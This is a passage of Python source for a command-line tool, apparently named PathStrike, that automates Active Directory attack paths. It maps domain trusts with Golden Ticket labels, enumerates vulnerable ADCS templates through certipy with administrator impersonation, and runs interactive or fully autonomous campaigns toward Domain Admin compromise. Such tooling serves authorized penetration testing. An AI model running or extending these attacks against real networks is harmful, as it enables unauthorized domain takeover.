                        edges_data.extend(row.get("edges", []))

            # Build node lookup
            node_map = {}
            for nid, ndata in nodes_data.items():
                props = {**ndata}
                inner = ndata.get("properties", {})
                if isinstance(inner, dict):
                    props.update(inner)
                node_map[nid] = {
                    "name": props.get("name", props.get("label", "Unknown")),
                    "sid": props.get("objectId", props.get("objectid", "")),
                }

            table = Table(title="Domain Trust Map")
            table.add_column("Source Domain", style="green")
            table.add_column("", style="bold")
            table.add_column("Target Domain", style="cyan")
            table.add_column("Type", style="yellow")
            table.add_column("Exploitable", style="red")

            for edge in edges_data:
                src_id = str(edge.get("source", ""))
                tgt_id = str(edge.get("target", ""))
                src = node_map.get(src_id, {"name": src_id, "sid": ""})
                tgt = node_map.get(tgt_id, {"name": tgt_id, "sid": ""})

                src_name = src["name"]
                tgt_name = tgt["name"]

                # Get actual edge label from BH CE
                edge_label = edge.get("label", edge.get("kind", "Trust"))

                # Detect trust direction
                if src_name.upper().endswith(f".{tgt_name.upper()}"):
                    trust_type = "Child→Parent"
                    exploitable = "Golden Ticket + EA SID History"
                elif tgt_name.upper().endswith(f".{src_name.upper()}"):
                    trust_type = "Parent→Child"
                    exploitable = "Golden Ticket"
                else:
                    trust_type = "External/Forest"
                    exploitable = "Inter-realm TGT"

                table.add_row(
                    src_name,
                    f"{edge_label} →",
                    tgt_name,
                    trust_type,
                    exploitable,
                )

            console.print(table)
            console.print(
                f"\n[dim]Use [bold]pathstrike attack[/dim] to exploit "
                "discovered trust paths automatically.[/]"
            )

    try:
        asyncio.run(_run())
    except Exception as exc:
        console.print(f"[bold red]Error:[/] {exc}")
        raise typer.Exit(code=1) from exc


@app.command()
def adcs(
    config: ConfigOption = None,
    user: Annotated[
        Optional[str],
        typer.Option(
            "--user",
            "-u",
            help="Authenticate as this user (sAMAccountName). Defaults to credentials.username from config.",
        ),
    ] = None,
    impersonate: Annotated[
        Optional[str],
        typer.Option(
            "--impersonate",
            help=(
                "Principal to impersonate via SAN when an ADCS exploit fires. "
                "Overrides ``target.adcs_impersonate`` from the config. "
                "Defaults to the configured value (which itself defaults to "
                "``administrator``)."
            ),
        ),
    ] = None,
    all_templates: Annotated[
        bool,
        typer.Option(
            "--all",
            help="Run `certipy find` without `-vulnerable` (lists every template/CA, not just exploitable ones).",
        ),
    ] = False,
    fmt: Annotated[
        str,
        typer.Option(
            "--format",
            "-f",
            help="Output format: table (default), json, or csv.",
        ),
    ] = "table",
    timeout: Annotated[
        int,
        typer.Option("--timeout", help="certipy subprocess timeout in seconds"),
    ] = 120,
    verbose: VerboseOption = False,
) -> None:
    """Discover ADCS Certificate Authorities and vulnerable templates via certipy.

    Runs ``certipy find -vulnerable`` against the configured DC using
    the credentials in ``pathstrike.yaml`` (or ``--user`` when you want
    to enumerate from a different acquired identity already in the
    credential store), then renders every (CA × template × ESC class)
    finding it surfaces.

    Useful when BloodHound's ADCS coverage is missing — SharpHound
    needs ``-c CertServices`` to populate certificate templates and many
    collection runs skip it.  This command works directly against AD CS
    so it sees every template the authenticated principal can enroll
    against, regardless of BH ingest state.

    The output mirrors what you'd see from ``certipy find -vulnerable``
    on the command line but with PathStrike's edge-type mapping
    applied, so the ``Edge Type`` column tells you exactly which
    handler would exploit each finding (e.g. ``ADCSESC1``,
    ``ADCSESC9a``).

    Use [bold]--all[/] to inventory every CA/template (no
    ``-vulnerable`` filter), useful for spotting templates that
    BloodHound missed entirely.

    [dim]This command is read-only — it does not request certificates,
    modify templates, or change AD state.  Exploitation comes from the
    matching ESC handler invoked by ``pathstrike attack`` /
    ``pathstrike campaign``.[/]
    """
    setup_logging(verbose=verbose)
    cfg = _load_config_or_exit(config)

    fmt = fmt.lower()
    if fmt not in {"table", "json", "csv"}:
        console.print(
            f"[bold red]Invalid --format:[/] {fmt} (expected table, json, or csv)"
        )
        raise typer.Exit(code=1)

    if not shutil.which("certipy"):
        console.print(
            "[bold red]certipy not found on PATH.[/]\n"
            "[dim]Install via:  pip install certipy-ad[/]"
        )
        raise typer.Exit(code=1)

    cred_store = _seed_credential_store(cfg)
    target_user = user or cfg.credentials.username

    async def _run():
        from pathstrike.engine.adcs_discovery import (
            discover_adcs,
            render_findings_table,
            resolve_impersonation_for_result,
        )

        # Quiet status banner — keep the table itself center stage.
        if fmt == "table":
            console.print(
                f"[bold]Running ADCS discovery as[/] [cyan]"
                f"{target_user}@{cfg.domain.name.upper()}[/] "
                f"[dim](certipy find{' -vulnerable' if not all_templates else ''}, "
                f"target {cfg.domain.dc_fqdn or cfg.domain.dc_host})[/]\n"
            )

        result = await discover_adcs(
            cfg,
            cred_store,
            username=target_user,
            vulnerable=not all_templates,
            timeout=timeout,
        )

        if not result.ok:
            from rich.markup import escape as _markup_escape
            console.print(
                f"[bold red]ADCS discovery failed:[/] "
                f"{_markup_escape(str(result.error))}"
            )
            raise typer.Exit(code=1)

        # Resolve impersonation target + SID via BloodHound (fail-soft —
        # we still render the table without -sid info if BH is unreachable
        # or doesn't know the principal).  Done inside a try/except around
        # the BH context manager so an unreachable / mis-configured BH
        # never breaks pure-discovery flow.
        from pathstrike.bloodhound.client import BloodHoundClient
        try:
            async with BloodHoundClient.connect(cfg.bloodhound) as bh_client:
                await resolve_impersonation_for_result(
                    result,
                    config=cfg,
                    bh_client=bh_client,
                    impersonate_override=impersonate,
                )
        except Exception as exc:
            console.print(
                f"[dim]BH unavailable for SID lookup ({exc}); "
                "rendering without SID.[/]"
            )
            await resolve_impersonation_for_result(
                result,
                config=cfg,
                bh_client=None,
                impersonate_override=impersonate,
            )

        if fmt == "json":
            import json as _json
            payload = {
                "identity": result.identity,
                "cas": result.cas,
                "findings": [
                    {
                        "template": f.template,
                        "esc": f.esc,
                        "edge_type": f.edge_type,
                        "ca_name": f.ca_name,
                        "principal": f.principal,
                    }
                    for f in result.findings
                ],
            }
            console.print(_json.dumps(payload, indent=2))
            return

        if fmt == "csv":
            console.print("esc,template,ca_name,edge_type,principal")
            for f in result.findings:
                row = ",".join(
                    _csv_escape(v) for v in
                    (f.esc, f.template, f.ca_name, f.edge_type, f.principal)
                )
                console.print(row)
            return

        # table format
        if result.cas:
            ca_table = Table(title="Certificate Authorities", show_header=True, header_style="bold cyan")
            ca_table.add_column("CA Name", style="yellow")
            for ca in result.cas:
                ca_table.add_row(ca)
            console.print(ca_table)
            console.print()

        if not result.findings:
            if all_templates:
                console.print(
                    "[bold yellow]No certificate templates returned.[/]\n"
                    "[dim]Either AD CS is not deployed in the target domain, "
                    "the authenticated principal cannot enumerate templates, "
                    "or certipy returned an empty inventory.[/]"
                )
            else:
                console.print(
                    "[bold yellow]No vulnerable templates found.[/]\n"
                    "[dim]Re-run with [bold]--all[/bold] to inventory every "
                    "template (including non-vulnerable ones), or with a "
                    "different [bold]--user[/bold] — different principals see "
                    "different templates based on their enrollment rights.[/]"
                )
            return

        console.print(render_findings_table(result))
        console.print(
            f"\n[dim]{len(result.findings)} finding(s) across "
            f"{len(result.cas) or '?'} CA(s).  Exploit via "
            "[bold]pathstrike campaign[/] (the matching ADCS handler "
            "fires automatically once BloodHound or live discovery "
            "surfaces the edge to the orchestrator).[/]"
        )

    try:
        asyncio.run(_run())
    except typer.Exit:
        raise
    except Exception as exc:
        from rich.markup import escape as _markup_escape
        console.print(f"[bold red]Error:[/] {_markup_escape(str(exc))}")
        raise typer.Exit(code=1) from exc


def _csv_escape(value: str) -> str:
    """Quote-escape a CSV field if it contains commas or quotes."""
    if not value:
        return ""
    if any(ch in value for ch in (",", '"', "\n")):
        return '"' + value.replace('"', '""') + '"'
    return value


@app.command()
def campaign(
    source: SourceOption = None,
    config: ConfigOption = None,
    mode: Annotated[
        ExecutionMode,
        typer.Option("--mode", "-m", help="Execution mode: interactive, auto, or dry_run"),
    ] = ExecutionMode.interactive,
    max_retries: Annotated[
        int,
        typer.Option("--max-retries", help="Max retries per step"),
    ] = -1,
    max_targets: Annotated[
        int,
        typer.Option("--max-targets", help="Max targets to pursue per round"),
    ] = 10,
    max_depth: Annotated[
        int,
        typer.Option("--max-depth", help="Maximum path depth when enumerating reachable targets"),
    ] = 10,
    high_value_only: Annotated[
        bool,
        typer.Option(
            "--high-value-only",
            help="Restrict discovery to Domain Admins / Enterprise Admins / Tier Zero / Domain nodes (old behavior)",
        ),
    ] = False,
    no_time_sync: Annotated[
        bool,
        typer.Option("--no-time-sync", help="Disable automatic ntpdate clock sync"),
    ] = False,
    impersonate: Annotated[
        Optional[str],
        typer.Option(
            "--impersonate",
            help=(
                "Principal to impersonate via SAN when an ADCS edge fires "
                "during the campaign.  Overrides ``target.adcs_impersonate`` "
                "from the config.  Defaults to the configured value (which "
                "itself defaults to ``administrator``)."
            ),
        ),
    ] = None,
    learn: Annotated[
        bool,
        typer.Option(
            "--learn",
            help="Don't execute — print the ordered commands to exploit each selected path (manual-ops playbook).",
        ),
    ] = False,
    redact: Annotated[
        bool,
        typer.Option("--redact", help="With --learn, redact secrets (hashes/passwords) in the printed commands."),
    ] = False,
    verbose: VerboseOption = False,
) -> None:
    """Interactive step-through attack campaign — exploit, requery, repeat.

    Enumerates every reachable exploitable node from your owned
    identities (users, groups, computers, domains) via handler-backed
    edges.  After each successful step, re-queries BH CE from the new
    position to surface additional paths — letting you step through
    an environment one compromise at a time.

    [bold yellow]Note:[/] BH CE is a static snapshot. If exploiting a
    step changes AD state (e.g. WriteOwner grants new ACLs), you must
    [bold]re-collect and re-upload[/] bloodhound-ce-python data between
    steps to see the newly-created edges in subsequent queries.

    Use [bold]--high-value-only[/] to restrict discovery to privileged
    targets (Domain Admins, Enterprise Admins, Tier Zero, Domain nodes)
    when you specifically want to drive toward final DA compromise.

    Use [bold]pathstrike auto[/] for greedy non-interactive escalation
    that chases the deepest reachable target without prompting.

    [bold green]Interactive mode[/] (default): shows ranked paths and asks
    before each execution.

    [bold yellow]Auto mode[/] (-m auto): fully autonomous — executes all
    paths by score without prompting.

    [bold cyan]Dry-run mode[/] (-m dry_run): discovers and ranks paths
    without executing anything.
    """
    setup_logging(verbose=verbose)
    cfg = _load_config_or_exit(config)

    # CLI-level override: stamp ``--impersonate`` onto the loaded config
    # so every ADCS handler sees the same impersonation target via the
    # config object (no separate plumbing path required).
    if impersonate:
        cfg.target.adcs_impersonate = impersonate

    source_name = _build_source_name(source, cfg)

    retry_policy = _build_retry_policy(cfg)
    if max_retries >= 0:
        retry_policy.max_retries = max_retries

    if no_time_sync or not cfg.execution.auto_time_sync:
        from pathstrike.engine.error_handler import ErrorCategory
        retry_on = set(retry_policy.retry_on)
        retry_on.discard(ErrorCategory.TIME_SKEW)
        retry_policy.retry_on = frozenset(retry_on)

    discovery_desc = "high-value targets only" if high_value_only else "all reachable targets"
    console.print(
        f"[bold]Campaign Mode:[/] {mode.value}\n"
        f"[bold]Source:[/] {source_name}\n"
        f"[bold]Discovery:[/] {discovery_desc}\n"
        f"[bold]Max targets per round:[/] {max_targets}\n"
        f"[bold]Max path depth:[/] {max_depth}\n"
        f"[bold]Max retries:[/] {retry_policy.max_retries}\n"
        f"[bold]Auto time sync:[/] {'disabled' if no_time_sync else 'enabled'}\n"
        f"[bold]ADCS impersonate:[/] {cfg.target.adcs_impersonate}\n"
    )

    async def _run():
        async with BloodHoundClient.connect(cfg.bloodhound) as client:
            cred_store = _seed_credential_store(cfg)
            rollback_mgr = RollbackManager(cfg)

            from pathstrike.engine.campaign import CampaignOrchestrator

            campaign_orch = CampaignOrchestrator(
                config=cfg,
                bh_client=client,
                cred_store=cred_store,
                rollback_mgr=rollback_mgr,
                retry_policy=retry_policy,
                mode=mode,
                verbose=verbose,
                max_targets=max_targets,
                reachable_mode=not high_value_only,
                max_depth=max_depth,
            )
            campaign_orch.learn = learn
            campaign_orch.learn_redact = redact

            result = await campaign_orch.run_campaign()
            _save_rollback_log(rollback_mgr, "campaign")

            if learn:
                return  # nothing executed; no compromise expectation
            if not result.targets_compromised and mode != ExecutionMode.dry_run:
                raise typer.Exit(code=1)

    try:
        asyncio.run(_run())
    except (ValueError, typer.Exit) as exc:
        if isinstance(exc, ValueError):
            console.print(f"[bold red]Config error:[/] {exc}")
        raise typer.Exit(code=1) from exc
    except Exception as exc:
        console.print(f"[bold red]Error:[/] {exc}")
        raise typer.Exit(code=1) from exc


if __name__ == "__main__":
    app()
